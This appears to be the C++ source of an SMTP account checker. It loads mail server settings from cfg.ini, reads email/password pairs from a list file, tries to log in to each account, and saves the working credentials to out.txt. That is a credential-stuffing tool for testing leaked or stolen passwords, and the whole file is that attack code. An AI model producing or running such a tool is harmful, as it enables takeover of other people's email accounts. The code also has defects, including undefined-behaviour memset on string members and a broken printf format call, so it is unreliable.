#include <iostream>
#include <fstream>
#include "base64.h"
#include "Csmtp.h"

const char* ConfigFile = ".//cfg.ini";

struct TCfgData
{
	int encryption;//0-non,1-tls,2-ssl,3-don't set
	int port;
	string type;
	string server;
};
vector<TCfgData> g_cfgdata;

string &strTrim(string & str)
{
	if (str.empty())
	{
		return str;
	}
	str.erase(0, str.find_first_not_of(" "));
	str.erase(str.find_last_not_of(" ") + 1);
	return str;
}

void loadCfgFile()
{
	ifstream rf;
	rf.open(ConfigFile);
	if (!rf.is_open())
	{
		printf("error : not found cfg.ini\r\n");
		exit(-1);
	}
	string strline;
	int pos = 0;
	TCfgData cdata;
	memset((void *)&cdata, 0, sizeof(TCfgData));
	bool newtype = false;
	while (getline(rf, strline))
	{
		if (strline.empty())
		{
			continue;
		}
		if ((pos = strline.find('=')) >= 0)
		{
			string left = strline.substr(0, pos);
			string right = strline.substr(pos + 1, strline.size() - pos);
			strTrim(left);
			strTrim(right);
			
			if (left == "type")
			{
				if (newtype)
				{
					g_cfgdata.push_back(cdata);
					memset((void *)&cdata, 0, sizeof(TCfgData));
				}
				cdata.type = right;				
				newtype = true;
			}
			else if (left == "encryption")
			{
				cdata.encryption = atoi(right.c_str());
			}
			else if (left == "server")
			{
				cdata.server = right;
			}
			else if (left == "port")
			{
				cdata.port = atoi(right.c_str());
			}
		}
	}
	g_cfgdata.push_back(cdata);
	rf.close();
}

void WriteCorrectAccout(std::string mail, std::string pwd)
{
	ofstream ofs;
	ofs.open("out.txt", ios::app);
	if (!ofs.is_open())
	{
		printf("error : can not output file.\r\n");
		exit(-1);
	}
	ofs << mail << endl;
	ofs << pwd << endl;
	ofs << endl;
	ofs.close();
}

void CheckAccout(TCfgData cfg, std::string mail, std::string pwd)
{
	bool bError = false;
	CSmtp auth;
	try
	{	
		auth.SetSMTPServer(cfg.server.c_str(), cfg.port);
		switch (cfg.encryption)
		{
		case 0:
			auth.SetSecurityType(NO_SECURITY);
			break;
		case 1:
			auth.SetSecurityType(USE_TLS);
			break;
		case 2:
			auth.SetSecurityType(USE_SSL);
			break;
		case 3:
			auth.SetSecurityType(DO_NOT_SET);
			break;
		}
		auth.SetLogin(mail.c_str());
		auth.SetPassword(pwd.c_str());

		auth.Send();
	}
	catch (ECSmtp e)
	{
		std::cout << "Error: " << e.GetErrorText().c_str() << ".\n";
		bError = true;
	}
	if (!bError)
	{
		if (auth.isAuthSuccessful())
		{
			WriteCorrectAccout(mail, pwd);
		}
	}
}

int main(int argc, char* argv[])
{
	loadCfgFile();

	ifstream rf;
	rf.open(argv[1]);
	if (!rf.is_open())
	{
		printf("error : not found %s\r\n, argv[1]");
		exit(-1);
	}
	string strline;
	int pos = 0;
	TCfgData cfgdata;
	bool bGetPwd = false;
	string mail, pwd;
	while (getline(rf, strline))
	{
		if (bGetPwd)
		{
			pwd = strline;
			bGetPwd = false;
			CheckAccout(cfgdata, mail, pwd);
			continue;
		}
		vector<TCfgData>::iterator it;
		for (it = g_cfgdata.begin(); it != g_cfgdata.end(); ++it)
		{
			if ((pos = strline.find((*it).type)) >= 0)
			{
				cfgdata = (*it);
				mail = strline;
				bGetPwd = true;
				continue;
			}
		}
	}

	//system("pause");
	return 0;
}
